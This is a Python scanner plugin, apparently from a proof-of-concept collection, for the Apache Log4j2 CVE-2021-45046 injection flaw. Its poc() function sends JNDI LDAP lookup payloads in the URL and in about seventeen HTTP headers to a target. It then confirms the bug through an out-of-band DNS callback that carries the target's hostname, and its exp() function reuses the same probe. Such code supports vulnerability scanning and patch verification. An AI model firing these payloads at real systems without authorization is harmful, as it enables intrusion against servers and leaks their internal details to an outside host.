import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Apache Log4j2 Remote Code Injection''',
        "description": '''Apache Log4j2 Thread Context Lookup Pattern is vulnerable to remote code execution in certain non-default configurations.''',
        "severity": "critical",
        "references": [
            "https://securitylab.github.com/advisories/GHSL-2021-1054_GHSL-2021-1055_log4j2/", 
            "https://twitter.com/marcioalm/status/1471740771581652995", 
            "https://logging.apache.org/log4j/2.x/"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-45046",
            "cwe-id": "CWE-502"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "rce", "oast", "log4j", "injection"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/?x=${jndi:ldap://127.0.0.1#.${hostName}.%s/a}""" % oob_domain
        method = "GET"
        data = """"""
        headers = {'Accept': '${jndi:ldap://127.0.0.1#.${hostName}.accept.%s}' % oob_domain, 'Accept-Encoding': '${jndi:ldap://127.0.0.1#.${hostName}.acceptencoding.%s}' % oob_domain, 'Accept-Language': '${jndi:ldap://127.0.0.1#.${hostName}.acceptlanguage.%s}' % oob_domain, 'Access-Control-Request-Headers': '${jndi:ldap://127.0.0.1#.${hostName}.accesscontrolrequestheaders.%s}' % oob_domain, 'Access-Control-Request-Method': '${jndi:ldap://127.0.0.1#.${hostName}.accesscontrolrequestmethod.%s}' % oob_domain, 'Authentication': 'Bearer ${jndi:ldap://127.0.0.1#.${hostName}.authenticationbearer.%s}' % oob_domain, 'Cookie': '${jndi:ldap://127.0.0.1#.${hostName}.cookiename.%s}=${jndi:ldap://${hostName}.cookievalue.%s}'  % (oob_domain, oob_domain), 'Location': '${jndi:ldap://127.0.0.1#.${hostName}.location.%s}' % oob_domain, 'Origin': '${jndi:ldap://127.0.0.1#.${hostName}.origin.%s}' % oob_domain, 'Referer': '${jndi:ldap://127.0.0.1#.${hostName}.referer.%s}' % oob_domain, 'Upgrade-Insecure-Requests': '${jndi:ldap://127.0.0.1#.${hostName}.upgradeinsecurerequests.%s}' % oob_domain, 'User-Agent': '${jndi:ldap://127.0.0.1#.${hostName}.useragent.%s}' % oob_domain, 'X-Api-Version': '${jndi:ldap://127.0.0.1#.${hostName}.xapiversion.%s}' % oob_domain, 'X-CSRF-Token': '${jndi:ldap://127.0.0.1#.${hostName}.xcsrftoken.%s}' % oob_domain, 'X-Druid-Comment': '${jndi:ldap://127.0.0.1#.${hostName}.xdruidcomment.%s}' % oob_domain, 'X-Forwarded-For': '${jndi:ldap://127.0.0.1#.${hostName}.xforwardedfor.%s}' % oob_domain, 'X-Origin': '${jndi:ldap://127.0.0.1#.${hostName}.xorigin.%s}' % oob_domain}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url